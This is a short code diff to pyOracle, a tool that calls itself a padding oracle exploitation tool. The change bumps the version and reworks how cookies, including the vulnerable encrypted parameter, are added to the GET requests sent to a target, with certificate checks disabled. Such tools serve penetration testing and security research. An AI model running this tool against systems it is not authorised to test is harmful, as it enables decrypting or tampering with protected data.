@@ -1,4 +1,4 @@
-# pyOracle 2.0.1
+# pyOracle 2.0.2
 # A python padding oracle vulnerability exploitation tool
 # By Paul Mueller (l1qu1d)
 
@@ -176,20 +176,20 @@ class Job:
                 # add the vulnerable parameter 
                 urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + b64urlEncode(encryptedstring)
 
-            elif self.inputMode == "cookie":
-                tempcookies = self.cookies.copy()
-                tempcookies[self.vulnerableParameter] = encryptedstring
-                # add cookies to headers
-                
-                cookieString = makeCookieString(tempcookies)
-                headers['Cookie'] = cookieString
-            
             # add the additional parameters
             for additionalParameter in self.additionalParameters.items():
                 urlBuilder = urlBuilder + '&' + additionalParameter[0] + '=' + additionalParameter[1] 
 
+            tempcookies = self.cookies.copy()            
 
-                
+            # if the vulnerable parameter is a cookie, add it
+            if self.inputMode == "cookie":
+                tempcookies[self.vulnerableParameter] = encryptedstring
+
+            # if there are cookies (additional or vulnerable parameters) they get added here
+            cookieString = makeCookieString(tempcookies)
+            headers['Cookie'] = cookieString
+                         
             r = requests.get(urlBuilder,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)    
                 
         elif (self.httpMethod == "POST"):
